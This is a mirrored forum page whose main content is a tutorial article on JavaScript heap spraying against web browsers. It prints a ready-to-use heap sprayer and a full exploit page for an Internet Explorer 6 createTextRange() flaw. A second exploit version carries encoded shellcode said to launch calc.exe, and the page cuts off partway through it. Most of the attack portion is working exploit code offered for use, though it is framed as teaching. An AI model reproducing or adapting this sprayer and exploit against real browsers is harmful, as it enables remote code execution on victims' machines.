<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html dir="ltr" lang="en" xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml"><!-- Mirrored from garage4hackers.com/content.php?r=21-Heap-Spray-Slipping-CPU-to-our-pocket-by-quot-vinnu-quot by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 10:49:31 GMT --><!-- Added by HTTrack --><head><meta content="text/html;charset=utf-8" http-equiv="content-type"/><!-- /Added by HTTrack -->

    <meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
<meta content="index.html" id="e_vb_meta_bburl" name="vb_meta_bburl"/>
<base/><!--[if IE]></base><![endif]-->
<meta content="vBulletin 4.2.1" name="generator"/>
<meta content="IE=9" http-equiv="X-UA-Compatible"/>

	<link href="favicon.ico" rel="Shortcut Icon" type="image/x-icon"/>


		<meta content="" name="keywords"/>
		<meta content='Heap Spray --- Slipping CPU to our pocket--by "vinnu"' name="description"/>



	<meta content="170793809601191" property="fb:app_id"/>
<meta content="Garage4hackers Forum" property="og:site_name"/>
<meta content='Heap Spray --- Slipping CPU to our pocket--by "vinnu"' property="og:description"/>
<meta content="contentda98.html?r=21-Heap-Spray-Slipping-CPU-to-our-pocket-by-quot-vinnu-quot" property="og:url"/>
<meta content="article" property="og:type"/>




	
		<script src="../yui.yahooapis.com/comboaa66?2.9.0/build/yuiloader-dom-event/yuiloader-dom-event.js&amp;2.9.0/build/connection/connection-min.js" type="text/javascript"></script>
	

<script type="text/javascript">
<!--
	if (typeof YAHOO === 'undefined') // Load ALL YUI Local
	{
		document.write('<script type="text/javascript" src="clientscript/yui/yuiloader-dom-event/yuiloader-dom-event6719.html?v=421"><\/script>');
		document.write('<script type="text/javascript" src="clientscript/yui/connection/connection-min6719.html?v=421"><\/script>');
		var yuipath = 'clientscript/yui';
		var yuicombopath = '';
		var remoteyui = false;
	}
	else	// Load Rest of YUI remotely (where possible)
	{
		var yuipath = 'http://yui.yahooapis.com/2.9.0/build';
		var yuicombopath = 'http://yui.yahooapis.com/combo';
		var remoteyui = true;
		if (!yuicombopath)
		{
			document.write('<script type="text/javascript" src="../yui.yahooapis.com/2.9.0/build/connection/connection-min6719.js?v=421"><\/script>');
		}
	}
	var SESSIONURL = "";
	var SECURITYTOKEN = "guest";
	var IMGDIR_MISC = "images/misc";
	var IMGDIR_BUTTON = "images/buttons";
	var vb_disable_ajax = parseInt("0", 10);
	var SIMPLEVERSION = "421";
	var BBURL = "index.html";
	var LOGGEDIN = 0 > 0 ? true : false;
	var THIS_SCRIPT = "vbcms";
	var RELPATH = "contentda98.html?r=21-Heap-Spray-Slipping-CPU-to-our-pocket-by-quot-vinnu-quot";
	var PATHS = {
		forum : "",
		cms   : "",
		blog  : ""
	};
	var AJAXBASEURL = "index.html";
// -->
</script>
<script src="clientscript/vbulletin-core6719.js?v=421" type="text/javascript"></script>



	<link href="external9476.php?type=RSS2" rel="alternate" title="Garage4hackers Forum RSS Feed" type="application/rss+xml"/>
	



	<link href="css30f2.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=bbcode.css,editor.css,popupmenu.css,reset-fonts.css,vbulletin.css,vbulletin-chrome.css,vbulletin-formcontrols.css," rel="stylesheet" type="text/css"/>

	<!--[if lt IE 8]>
	<link rel="stylesheet" type="text/css" href="css.php?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=popupmenu-ie.css,vbulletin-ie.css,vbulletin-chrome-ie.css,vbulletin-formcontrols-ie.css,editor-ie.css" />
	<![endif]-->


    
        <link href="externalbc09.php?do=rss&amp;type=newcontent&amp;sectionid=1&amp;days=120&amp;count=10" rel="alternate" title="Garage4hackers Forum - CMS RSS Feed" type="application/rss+xml"/>
    
    <title>Garage4hackers Forum - Heap Spray --- Slipping CPU to our pocket--by "vinnu"</title>
	
		<link href="css6862.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=widgets.css,vbcms.css,postbit-lite.css,postlist.css,lightbox.css,overlay.css,tagcloud.css," rel="stylesheet" type="text/css"/>
	
    <!--[if lt IE 8]>
        <link rel="stylesheet" type="text/css" href="css.php?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=vbcms-ie.css,postbit-lite-ie.css,postlist-ie.css" />
    <![endif]-->
    <!--[if lt IE 7]>
	<script type="text/javascript">
		window.LESS_THAN_IE7 = true;
	</script>
    <![endif]-->
	<script src="clientscript/vbulletin_overlay6719.html?v=421" type="text/javascript"></script>
	<script src="clientscript/vbulletin_cms6719.html?v=421" type="text/javascript"></script>
	<script src="clientscript/vbulletin_ajax_htmlloader6719.js?v=421" type="text/javascript">
    </script>
    <link href="css657d.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=additional.css" rel="stylesheet" type="text/css"/>

</head>
<body style="text-align:left">
<div class="above_body"> <!-- closing tag is in template navbar -->
<div class="floatcontainer doc_header" id="header">
	<div><a class="logo-image" href="forum.html" name="top"><img alt="Garage4hackers Forum" src="images/misc/vbulletin4_logo.png"/></a></div>
	<div class="toplinks" id="toplinks">
		
			<ul class="nouser">
			
				<li><a href="register.html" rel="nofollow">Register</a></li>
			
				<li><a href="faq.html" rel="help">Help</a></li>
				<li>
			<script src="clientscript/vbulletin_md56719.html?v=421" type="text/javascript"></script>
			<form action="../external.html?link=http://garage4hackers.com/login.php?do=login" id="navbar_loginform" method="post" onsubmit="md5hash(vb_login_password, vb_login_md5password, vb_login_md5password_utf, 0)">
				<fieldset class="logindetails" id="logindetails">
					<div>
						<div>
					<input accesskey="u" class="textbox default-value" id="navbar_username" name="vb_login_username" size="10" tabindex="101" type="text" value="User Name"/>
					<input class="textbox" id="navbar_password" name="vb_login_password" size="10" tabindex="102" type="password"/>
					<input class="textbox default-value" id="navbar_password_hint" name="vb_login_password_hint" size="10" style="display:none;" tabindex="102" type="text" value="Password"/>
					<input accesskey="s" class="loginbutton" tabindex="104" title="Enter your username and password in the boxes provided to login, or click the 'register' button to create a profile for yourself." type="submit" value="Log in"/>
						</div>
					</div>
				</fieldset>
				<div class="remember" id="remember">
					<label for="cb_cookieuser_navbar"><input accesskey="c" class="cb_cookieuser_navbar" id="cb_cookieuser_navbar" name="cookieuser" tabindex="103" type="checkbox" value="1"/> Remember Me?</label>
				</div>

				<input name="s" type="hidden" value=""/>
				<input name="securitytoken" type="hidden" value="guest"/>
				<input name="do" type="hidden" value="login"/>
				<input name="vb_login_md5password" type="hidden"/>
				<input name="vb_login_md5password_utf" type="hidden"/>
			</form>
			<script type="text/javascript">
			YAHOO.util.Dom.setStyle('navbar_password_hint', "display", "inline");
			YAHOO.util.Dom.setStyle('navbar_password', "display", "none");
			vB_XHTML_Ready.subscribe(function()
			{
			//
				YAHOO.util.Event.on('navbar_username', "focus", navbar_username_focus);
				YAHOO.util.Event.on('navbar_username', "blur", navbar_username_blur);
				YAHOO.util.Event.on('navbar_password_hint', "focus", navbar_password_hint);
				YAHOO.util.Event.on('navbar_password', "blur", navbar_password);
			});
			
			function navbar_username_focus(e)
			{
			//
				var textbox = YAHOO.util.Event.getTarget(e);
				if (textbox.value == 'User Name')
				{
				//
					textbox.value='';
					textbox.style.color='#000000';
				}
			}

			function navbar_username_blur(e)
			{
			//
				var textbox = YAHOO.util.Event.getTarget(e);
				if (textbox.value == '')
				{
				//
					textbox.value='User Name';
					textbox.style.color='#777777';
				}
			}
			
			function navbar_password_hint(e)
			{
			//
				var textbox = YAHOO.util.Event.getTarget(e);
				
				YAHOO.util.Dom.setStyle('navbar_password_hint', "display", "none");
				YAHOO.util.Dom.setStyle('navbar_password', "display", "inline");
				YAHOO.util.Dom.get('navbar_password').focus();
			}

			function navbar_password(e)
			{
			//
				var textbox = YAHOO.util.Event.getTarget(e);
				
				if (textbox.value == '')
				{
					YAHOO.util.Dom.setStyle('navbar_password_hint', "display", "inline");
					YAHOO.util.Dom.setStyle('navbar_password', "display", "none");
				}
			}
			</script>
				</li>
				
					<li class="hidden" id="fb_headerbox">

	<a href="#" id="fb_loginbtn"><img alt="The Facebook Platform" src="images/misc/facebook_login.gif"/></a>

</li>

				
			</ul>
		
	</div>
	<div class="ad_global_header">
		 
		 
	</div>
	<hr/>
</div>
<div class="navbar" id="navbar">
	<ul class="navtabs floatcontainer" id="navtabs">
		
		
	
		<li id="vbtab_whatsnew">
			<a class="navtab" href="activity.html">What's New?</a>
		</li>
		
		

	
		<li class="selected" id="vbtab_cms">
			<a class="navtab" href="content.html">Articles</a>
		</li>
		
		
			<ul class="floatcontainer">
				
					
						
							<li id=""><a href="content5ee7.html?r=1-home">Home</a></li>
						
					
				
			</ul>
		

	
		<li id="vbtab_forum">
			<a class="navtab" href="forum.html">Forum</a>
		</li>
		
		

	
		<li id="vbtab_blog">
			<a class="navtab" href="blog.html">Blogs</a>
		</li>
		
		

	
		<li id="tab_nja4_357">
			<a class="navtab" href="pages7b82.html?pageid=2">G4H Team</a>
		</li>
		
		

	
		<li id="tab_nta0_579">
			<a class="navtab" href="pages8782.html?pageid=3">IRC</a>
		</li>
		
		

	
		<li id="tab_nta0_442">
			<a class="navtab" href="pagesdbe0.html?pageid=4">Ranchoddas</a>
		</li>
		
		

		<li>
            <a class="navtab" href="pages.html">Events and Conferences</a></li>
	</ul>
	
		<div class="globalsearch" id="globalsearch">
			<form action="../external.html?link=http://garage4hackers.com/search.php?do=process" class="navbar_search" id="navbar_search" method="post">
				
				<input name="securitytoken" type="hidden" value="guest"/>
				<input name="do" type="hidden" value="process"/>
				<span class="textboxcontainer"><span><input class="textbox" name="query" tabindex="99" type="text" value=""/></span></span>
				<span class="buttoncontainer"><span><input class="searchbutton" name="submit" onclick="document.getElementById('navbar_search').submit;" src="images/buttons/search.html" tabindex="100" type="image"/></span></span>
			</form>
			<ul class="navbar_advanced_search">
				<li><a accesskey="4" href="search.html">Advanced Search</a></li>
				
			</ul>
		</div>
	
</div>
</div><!-- closing div for above_body -->

<div class="body_wrapper">
<div class="breadcrumb" id="breadcrumb">
	<ul class="floatcontainer">
		<li class="navbithome"><a accesskey="1" href="content.html"><img alt="Home" src="images/misc/navbit-home.png"/></a></li>
		
	<li class="navbit"><a href="content.html">Home</a></li>

	<li class="navbit"><a href="contentc520.html?r=163-exploitation-techniques">Exploitation Techniques</a></li>

		
	<li class="navbit lastnavbit"><span>Heap Spray --- Slipping CPU to our pocket--by "vinnu"</span></li>

	</ul>
	<hr/>
</div>


<div style="width:728px; margin:0 auto; padding-bottom:1em">
<script type="text/javascript"><!--
google_ad_client = "ca-pub-6847984837250662";
google_ad_host = "ca-host-pub-2606800903002383";
google_ad_width = 728;
google_ad_height = 15;
google_ad_format = "728x15_0ads_al_s";
google_ad_channel = "";
google_color_border = "";
google_color_bg = "";
google_color_link = "";
google_color_text = "";
google_color_url = "";
google_ui_features = "rc:6";
//-->
</script>
<script src="../pagead2.googlesyndication.com/pagead/show_ads.js" type="text/javascript">
</script>
</div>

<div id="ad_global_below_navbar"><script async="" src="../pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
<!-- garage1 -->
<ins class="adsbygoogle" data-ad-client="ca-pub-6847984837250662" data-ad-slot="4036513682" style="display:inline-block;width:728px;height:90px"></ins>
<script>
(adsbygoogle = window.adsbygoogle || []).push({});
</script></div>


	<form action="../external.html?link=http://garage4hackers.com/profile.php?do=dismissnotice" class="notices" id="notices" method="post">
		<input name="do" type="hidden" value="dismissnotice"/>
		<input name="s" type="hidden" value=""/>
		<input name="securitytoken" type="hidden" value="guest"/>
		<input id="dismiss_notice_hidden" name="dismiss_noticeid" type="hidden" value=""/>
		<input name="url" type="hidden" value=""/>
		<ol>
			<li class="restore" id="navbar_notice_2">
	
	
<h2>
The forum is <a href="showthread1180.html?t=7049&amp;p=14985#post14985">frozen forever</a> - but it won't die; it'll stay for long in search engine results and we hope it would keep helping newbies in some way or other - cheers! 


</h2>

<!-- Mirrored from garage4hackers.com/content.php?r=21-Heap-Spray-Slipping-CPU-to-our-pocket-by-quot-vinnu-quot by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 10:49:31 GMT -->

</li>
		</ol>
	</form>



<div class="vbcms_content">
<div class="yui-tvb-r3" id="doc3">
	<div id="bd">
		<div id="yui-main">
			<div class="yui-b">
				<div class="yui-gf">
					<div class="yui-u first yui-panel">
						<ul class="list_no_decoration widget_list" id="widgetlist_column1">
<li><script type="text/javascript">
<!--
	var IMGDIR_MISC = "images/misc";
	var vb_disable_ajax = parseInt("0", 10);

        /* Start Sections Widget Configuration */
        vbGlobal_SHOW_ALL_TREE_ELEMENTS_THRESHOLD = parseInt("5");
        /* End Seections Widget Configuration */
// -->
</script>
<script type="text/javascript">
<!--
	document.write('<script type="text/javascript" src="' + yuipath + '/treeview/treeview-min.js"></script>');
	loadVbCss(yuipath + '/treeview/assets/skins/sam/treeview.css');
//-->
</script>
<!-- end treeview css -->

<!-- custom treeview styles defined at template: headinclude -->

<!-- END VB Tree-Menu Implementation of YUI TreeView -->
<div class="cms_widget">
	<div class="block">
		<div class="cms_widget_header">
			<h3><img alt="" src="images/cms/sections.png"/> Menu</h3>
		</div>
		<div class="cms_widget_content widget_content">
			<div class="vb-tree-menu">
				<ul>
<li><a href="contentfbb6.html?r=5-g4h-tutorial-and-research-papers" title="G4H Tutorial and Papers">G4H Tutorial and Papers</a>
</li>
<li><a href="content842d.html?r=4-g4h-tools-and-scripts" title="G4H Tools and Scripts">G4H Tools and Scripts</a>
</li>
<li><a href="content8f5d.html?r=2-garage4hackers-exploits" title="G4H Exploits">G4H Exploits</a>
</li>
<li><a href="content7820.html?r=107-ctf-amp-meet-writeups" title="CTF &amp; Meet Writeups">CTF &amp; Meet Writeups</a>
</li>
<li><a href="content0b4f.html?r=128-google-vulnerabilities" title="Google Hall of Fame">Google Hall of Fame</a>
</li>
<li><a href="contentf20a.html?r=134-teensy" title="Teensy">Teensy</a>
</li>
<li><a href="content93b9.html?r=136-webapp-exploits" title="Bug Bounty Listing">Bug Bounty Listing</a>
</li>
<li><a href="contentdb2e.html?r=151-web-application-security" title="Web Application Security">Web Application Security</a>
</li>
<li><a href="contentc520.html?r=163-exploitation-techniques" title="Exploitation Techniques">Exploitation Techniques</a>
</li>
<li><a href="content90cc.html?r=172-ranchoddas-webcast-recording" title="RWS Webcast Recording">RWS Webcast Recording</a>
</li>
<li><a href="contente989.html?r=179-blogs" title="Blogs">Blogs</a>
</li></ul>
 
			</div>
				<noscript>
					<div class="cms_widget_sectionnav">
						<div class="cms_widget_sectionnav_page">
							
								
									<div class="main_menuitem" style="text-indent:20px">
								
								<a href="contentfbb6.html?r=5-g4h-tutorial-and-research-papers">G4H Tutorial and Papers</a></div>
							
								
									<div class="main_menuitem" style="text-indent:20px">
								
								<a href="content842d.html?r=4-g4h-tools-and-scripts">G4H Tools and Scripts</a></div>
							
								
									<div class="main_menuitem" style="text-indent:20px">
								
								<a href="content8f5d.html?r=2-garage4hackers-exploits">G4H Exploits</a></div>
							
								
									<div class="main_menuitem" style="text-indent:20px">
								
								<a href="content7820.html?r=107-ctf-amp-meet-writeups">CTF &amp; Meet Writeups</a></div>
							
								
									<div class="main_menuitem" style="text-indent:20px">
								
								<a href="content0b4f.html?r=128-google-vulnerabilities">Google Hall of Fame</a></div>
							
								
									<div class="main_menuitem" style="text-indent:20px">
								
								<a href="contentf20a.html?r=134-teensy">Teensy</a></div>
							
								
									<div class="main_menuitem" style="text-indent:20px">
								
								<a href="content93b9.html?r=136-webapp-exploits">Bug Bounty Listing</a></div>
							
								
									<div class="main_menuitem" style="text-indent:20px">
								
								<a href="contentdb2e.html?r=151-web-application-security">Web Application Security</a></div>
							
								
									<div class="active_menuitem" style="text-indent:20px">
								
								<a href="contentc520.html?r=163-exploitation-techniques">Exploitation Techniques</a></div>
							
								
									<div class="main_menuitem" style="text-indent:20px">
								
								<a href="content90cc.html?r=172-ranchoddas-webcast-recording">RWS Webcast Recording</a></div>
							
								
									<div class="main_menuitem" style="text-indent:20px">
								
								<a href="contente989.html?r=179-blogs">Blogs</a></div>
							
						</div>
					</div>
				</noscript>			
		</div>
	</div>
</div>

<script type="text/javascript">
	initVbTreeMenus(false);
</script></li>
</ul>
					</div>
					<div class="yui-u yui-panel">
						<ul class="list_no_decoration widget_list" id="widgetlist_column2">
<li><!-- styles defined in template: headinclude -->



<div class="article_width" id="article_content">
	<div class="title">
                <h1 class="article_title cms_article_title"><span>Heap Spray --- Slipping CPU to our pocket--by "vinnu"</span>
                        
		</h1>
	</div>
	<div class="article_author_date_comment_container">
                
		<div class="fullwidth">
			
				<div>
<fb:like action="../external.html?link=http://garage4hackers.com/like" colorscheme="light" font="tahoma" href="contentda98.html?r=21-Heap-Spray-Slipping-CPU-to-our-pocket-by-quot-vinnu-quot" layout="standard" show_faces="false" width="260"></fb:like></div>
			
			
				<div class="article_username_container">
					by <div class="popupmenu memberaction">
	<a class="username offline popupctrl" href="memberc1f0.html?u=18" title="prashant_uniyal is offline"><strong>prashant_uniyal</strong></a>
	<ul class="popupbody popuphover memberaction_body">
		<li class="left">
			<a class="siteicon_profile" href="memberc1f0.html?u=18">
				View Profile
			</a>
		</li>
		
		<li class="right">
			<a class="siteicon_forum" href="searchae80.html?do=finduser&amp;userid=18&amp;contenttype=vBForum_Post&amp;showposts=1" rel="nofollow">
				View Forum Posts
			</a>
		</li>
		
		
		<li class="left">
			<a class="siteicon_message" href="privateb48e.html?do=newpm&amp;u=18" rel="nofollow">
				Private Message
			</a>
		</li>
		
		
		
		<li class="right">
			<a class="siteicon_blog" href="blogc1f0.html?u=18" rel="nofollow">
				View Blog Entries
			</a>
		</li>
		
		
		
		<li class="left">
			<a class="siteicon_homepage" href="http://hackingethics.wordpress.com/">
				Visit Homepage
			</a>
		</li>
		
		
		
		<li class="right">
			<a class="siteicon_article" href="list5954.html?r=author/18-prashant_uniyal" rel="nofollow">
				View Articles
			</a>
		</li>
		

		

		
		
	</ul>
</div>
				</div>
			
                        
                                <div class="article_rating_container">
                                        <div class="popupmenu cmsratingmenu" id="cmsrating">
                                                <h6><a class="popupctrl" href="javascript://" id="cmsrating_current">Rate this article</a></h6>
                                                <form action="../external.html?link=http://garage4hackers.com/content.php?21/rate" id="cms_cmsrate_form" method="post">
                                                        <ul class="popupbody popuphover">
                                                                
                                                                        <li><label for="r5"><span class="rating5 cmsrating right">
                                                                                <input id="r5" name="vote" tabindex="1" type="radio" value="5"/> Excellent
                                                                        </span></label></li>
                                                                        <li><label for="r4"><span class="rating4 cmsrating right">
                                                                                <input id="r4" name="vote" tabindex="1" type="radio" value="4"/> Good
                                                                        </span></label></li>
                                                                        <li><label for="r3"><span class="rating3 cmsrating right">
                                                                                <input id="r3" name="vote" tabindex="1" type="radio" value="3"/> Average
                                                                        </span></label></li>
                                                                        <li><label for="r2"><span class="rating2 cmsrating right">
                                                                                <input id="r2" name="vote" tabindex="1" type="radio" value="2"/> Bad
                                                                        </span></label></li>
                                                                        <li><label for="r1"><span class="rating1 cmsrating right">
                                                                                <input id="r1" name="vote" tabindex="1" type="radio" value="1"/> Terrible
                                                                        </span></label></li>
                                                                        <li class="formsubmit"><input class="button" tabindex="1" type="submit" value="Vote Now"/></li>
                                                                
                                                        </ul>
                                                        <input name="s" type="hidden" value=""/>
                                                        <input name="securitytoken" type="hidden" value="guest"/>
                                                </form>
                                                <script src="clientscript/cms_ajax_rate6719.html?v=421" type="text/javascript"></script>
                                                <script type="text/javascript">
                                                <!--
                                                        var nodeid = 21;
                                                        vB_AJAX_CMSRate_Init('cms_cmsrate_form');
                                                //-->
                                                </script>
                                        </div>
                                </div>
                        
                        <div class="cms_clear"></div>
                        
				<div class="article_username_container">
					
						
							Published on 08-06-2010  10:49 PM
						
					
					
					
						 Number of Views: 3853
						 
					
				</div>
			
                       
                        <div class="article_rating_container">
                            	<a href="contentda98.html?r=21-Heap-Spray-Slipping-CPU-to-our-pocket-by-quot-vinnu-quot#comments" rel="nofollow"><span id="comments_top_count">0</span> <span id="comments_top_text"> Comments</span></a>
				<img alt="Comments" border="0" src="images/misc/comment.png"/>
                        </div>
                       
		</div>
	</div>
    
    <div class="clear"></div>
	<div class="article cms_clear restore postcontainer">Heap Spray --- Slipping CPU to our pocket<br/>
<br/>
Author : "vinnu"<br/>
Team : "Legion Of Xtremers" (LOXians)<br/>
Greetz : Prashant Uniyal, b0nd, D4rk357, skylined<br/>
<br/>
Rootkit Information:<br/>
<br/>
IDE: any text editor<br/>
Language : Javascript<br/>
Targets: Web browsers<br/>
<br/>
<br/>
As the name defines itself Heap Spray technique uses the spraying of heap memory<br/>
with injection vector.<br/>
Injection Vector: Nop sled + Shellcode<br/>
<br/>
This kind of exploitation is useful in use-after-free, double-free or memory corruption<br/>
vulnerabilities. In such attacks the program tries to access an object instance's methods or poroperties in heap<br/>
memory after the instance has been freed, this may lead to the code execution.<br/>
<br/>
A typical execution flow of a general heap spray exploit is as:<br/>
<br/>
<br/>
-------------------------<br/>
Allocate the object<br/>
&amp; properties if necessary<br/>
-------------------------<br/>
|<br/>
|<br/>
|<br/>
_I_<br/>
-------------------------<br/>
Free the object<br/>
-------------------------<br/>
|<br/>
|<br/>
|<br/>
_I_<br/>
------------------------<br/>
Spray the heap<br/>
------------------------<br/>
|<br/>
|<br/>
|<br/>
_I_<br/>
-------------------------<br/>
Trigger the vulnerability<br/>
-------------------------<br/>
<br/>
<br/>
<br/>
And in general we can seperate the heap spray exploits in two sections:<br/>
<br/>
1. Heap Sprayer<br/>
2. Vulnerability Trigger<br/>
<br/>
<br/>
1. Heap Sprayer : A heap sprayer sprays the heap with the properly alligned code to be executed<br/>
upon triggering the vulnerability. In heap spray the memory is repeatedly allocated in the heap area<br/>
and then injection vector is placed in it untill whole heap gets filled up.<br/>
<br/>
The ammount of spray depends upon the available memory for the program and the guessed position of the<br/>
block of memory in which the vulnerable instance of object gets placed in general.<br/>
<br/>
In order to develop some efficient sprayers, we must know a little about the fundamentals of allocations.<br/>
<br/>
When an object gets allocated in heap?<br/>
<br/>
Consider following two allocation:<br/>
<br/>
var a = "XXXXXXXXXXXXXXXXXXXXXxxxxx"<br/>
var b = new String("YYYYYYYYYYYYYYYY")<br/>
<br/>
<br/>
Well variable "a" will be allocated on stack whereas b will be allocated on heap.<br/>
<br/>
also consider following assignments:<br/>
<br/>
<br/>
var c = a + a;<br/>
var d = a.substring(0,a.length-3);<br/>
<br/>
<br/>
c and d Will also be allocated in heap area.<br/>
<br/>
Also take into note that whan a heap allocation occurs, the largest unused block gets deallocated first and then<br/>
the smaller chunk is allocated there. This also gives control of the heap allocations and its alignment to the attacker.<br/>
<br/>
Now we should know a little about the data placement in heap area.<br/>
<br/>
Consider a string "AAAA", it will be placed in memory as unicode string in following form:<br/>
<br/>
00 41 00 41 00 41 00 41 00 00<br/>
<br/>
<br/>
This kind of data handling can destroy the shellcode in memory. therefore, shellcode should be placed in memory<br/>
in unicode form occupying 00 bytes also with precious shellcode bytes.<br/>
<br/>
For examples consider 90 90 90 90 bytes to be placed in memory as nop sled. Then this nop sled can be allocated as:<br/>
<br/>
var nopsled = unescape("\u9090\u9090");<br/>
<br/>
Sameway the shellcode can be placed in memory.<br/>
<br/>
So now we have basic idea of code allocation. Now let us proceed to develop a sprayer:<br/>
<br/>
The heap spray is done in two stages.<br/>
<br/>
First a very large instance of injection vector is prepared &amp; allocated on heap area<br/>
and then it is sprayed all over heap to fill up all available memory for heap allocations.<br/>
<br/>
<br/>
Note: After a perfect heap spray, no further heap allocations can be done.<br/>
<br/>
<br/>
<br/>
<br/>
var shellcode = unescape('&lt;place Shellcode here&gt;'); // shellcode is assigned.<br/>
bigblock = unescape("%u0D0D%u0D0D"); // nop sled<br/>
headersize=20;shellcodesize = headersize + shellcode.length; //Proper length of shellcode in memory is calculated.<br/>
while(bigblock.length &lt; shellcodesize) {<br/>
bigblock += bigblock; // The nopsled of a little big size than shellcode size is first prepared.<br/>
}<br/>
heapshell = bigblock.substring(0, shellcodesize); // Nopsled of proper calculated shellcode length on heap is allocated.<br/>
nopsled = bigblock.substring(0, bigblock.length - shellcodesize); // another chunk of nopsled - propershellcode size in memory is allocated on heap<br/>
while(nopsled.length + shellcodesize &lt; 0x40000){ // Filling up 40000 words (word = 2bytes) for modern browsers. Lets name this line as "single chunk".<br/>
nopsled = nopsled + nopsled + heapshell; // A large single chunk at heap is being populated.<br/>
}<br/>
<br/>
<br/>
Above code properly adjusts the nop sled 0x0d0d0d0d and shellcode.<br/>
Now this large heap chunk contained in variable "nopsled" needs to be sprayed throughout the<br/>
heap along with shellcode suffixed to it as:<br/>
<br/>
<br/>
spray=new Array();var i=0;<br/>
for(i=0;i&lt;1000;i++) {<br/>
spray[i]=nopsled+shellcode; // Nopsled + shellcode being sprayed throughout the heap area.<br/>
}<br/>
<br/>
<br/>
<br/>
Above code will spray 1000 time the heap enough to bring down a 512 MB physical memory windows XP systems in modern<br/>
web browsers IE7 onwards.<br/>
<br/>
In case of IE6 and below, u may need to adjust the "single chunk" size and spray size accordingly.<br/>
<br/>
For examples in case of IE 6 single chunk can be made 86000 whereas spray size can be set to 200 or 400 as per vulnerabilities requirements.<br/>
<br/>
Now we have an efficient heap sprayer:<br/>
<br/>
&lt;----------------------heap sprayer------------------------&gt;<br/>
var shellcode=unescape('&lt;place Shellcode here&gt;');<br/>
bigblock=unescape("%u0D0D%u0D0D");<br/>
headersize=20;shellcodesize=headersize+shellcode.l  ength;<br/>
while(bigblock.length&lt;shellcodesize){bigblock+=big  block;}<br/>
heapshell=bigblock.substring(0,shellcodesize);<br/>
nopsled=bigblock.substring(0,bigblock.length-shellcodesize);<br/>
while(nopsled.length+shellcodesize&lt;0x40000){nopsle  d=nopsled+nopsled+heapshell}<br/>
<br/>
spray=new Array();var i=0;<br/>
for(i=0;i&lt;1000;i++){spray[i]=nopsled+shellcode;}<br/>
&lt;--------------------heap sprayer end----------------------&gt;<br/>
<br/>
<br/>
<br/>
<br/>
Now let us consider few real world vulnerabilities and develop the exploits with above heap sprayer.<br/>
<br/>
<br/>
1. IE 6 textranges(): The vulnerability lies in createTextRange() function associated with checkbox objects in html.<br/>
<br/>
<br/>
&lt;html&gt;<br/>
&lt;body&gt;<br/>
&lt;input type="checkbox" id='checkid'&gt;<br/>
&lt;script type=text/javascript language=javascript&gt;<br/>
a=document.getElementById('checkid');<br/>
b=a.createTextRange();<br/>
&lt;/script&gt;<br/>
&lt;/body&gt;<br/>
&lt;/html&gt;<br/>
<br/>
<br/>
<br/>
<br/>
In order to exploit such a vulnerability, we just need to spray the heap right before triggering the vulnerability.<br/>
after hit and trials and adjustments of "single chunk" size and spray size, we got an efficient exploit :<br/>
<br/>
<br/>
&lt;!----------------------textranges.htm----------------&gt;<br/>
&lt;html&gt;<br/>
&lt;body&gt;<br/>
&lt;script language=javascript&gt;<br/>
/*----------------------heap sprayer------------------------*/<br/>
var shellcode=unescape('&lt;place Shellcode here&gt;');<br/>
bigblock=unescape("%u0D0D%u0D0D");<br/>
headersize=20;shellcodesize=headersize+shellcode.l  ength;<br/>
while(bigblock.length&lt;shellcodesize){bigblock+=big  block;}<br/>
heapshell=bigblock.substring(0,shellcodesize);<br/>
nopsled=bigblock.substring(0,bigblock.length-shellcodesize);<br/>
while(nopsled.length+shellcodesize&lt;0x82000){nopsle  d=nopsled+nopsled+heapshell}<br/>
<br/>
spray=new Array();var i=0;<br/>
for(i=0;i&lt;400;i++){spray[i]=nopsled+shellcode;}<br/>
/*--------------------heap sprayer end----------------------*/<br/>
&lt;/script&gt;<br/>
&lt;input type="checkbox" id='checkid'&gt;<br/>
&lt;script type=text/javascript language=javascript&gt;<br/>
a=document.getElementById('checkid');<br/>
b=a.createTextRange();<br/>
&lt;/script&gt;<br/>
&lt;/body&gt;<br/>
&lt;/html&gt;<br/>
&lt;!--------------------textranges.htm end--------------&gt;<br/>
<br/>
<br/>
<br/>
with calc.exe execution shellcode<br/>
<br/>
<br/>
&lt;!----------------------textranges.htm----------------&gt;<br/>
&lt;html&gt;<br/>
&lt;body&gt;<br/>
&lt;script language=javascript&gt;<br/>
/*----------------------heap sprayer------------------------*/<br/>
var shellcode=unescape('%u9090%u9090%u9090%u9090%uceba  %u11fa%u291f%ub1c9%udb33%ud9ce%u2474%u5ef4%u5631%u  030e%u0e56%u0883%uf3fe%u68ea%u7a17%u9014%u1de8%u75  9c%u0fd9%ufefa%u8048%u5288%u6b61%u46dc%u19f2%u69c9  %u94b3%u442f%u1944%u0af0%u3b86%u508c%u9bdb%u9bad%u  dd2e%uc1ea%u8fc1%u8ea3%u2070%ud2c7%u4148%u5907%u39  f0%u9d22%uf385%ucd2d%u8f36%uf566%ud73d%u0456%u0b91  %u4faa%uf89e%u4e58%u3176%u61a0%u9eb6%u4e9f%ude3b%u  68d8%u95a4%u8b12%uae59%uf6e0%u3b85%u50f5%u9b4d%u61  dd%u7a82%u6d95%u086f%u71f1%udd6e%u8d89%ue0fb%u045d  %uc6bf%u4d79%u661b%u2bdb%u97ca%u933b%u3db3%u3137%u  44a7%u5f1a%uc436%u2620%ud638%u082a%ue751%uc7a1%uf8  26%uac63%u1ac9%ud8a6%u8361%u6123%u34ec%ua59e%ub709  %u552b%ua7ee%u5059%u6faa%u28b1%u05a3%u9fb5%u0fc4%u  7ed6%ud357%ue537%u76df%u4148');<br/>
bigblock=unescape("%u0D0D%u0D0D");<br/>
headersize=20;shellcodesize=headersize+shellcode.l  ength;<br/>
